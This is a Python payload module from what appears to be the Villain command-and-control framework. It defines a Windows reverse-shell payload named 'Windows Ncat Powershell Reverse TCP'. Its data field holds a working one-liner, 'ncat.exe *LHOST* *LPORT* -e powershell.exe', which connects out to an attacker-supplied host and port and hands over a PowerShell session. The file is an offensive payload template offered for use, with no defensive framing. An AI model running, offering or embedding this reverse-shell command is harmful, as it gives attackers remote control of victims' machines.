# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows Ncat Powershell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ncat Powershell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'ncat',
        'type' : 'ncat-powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "ncat.exe *LHOST* *LPORT* -e powershell.exe"
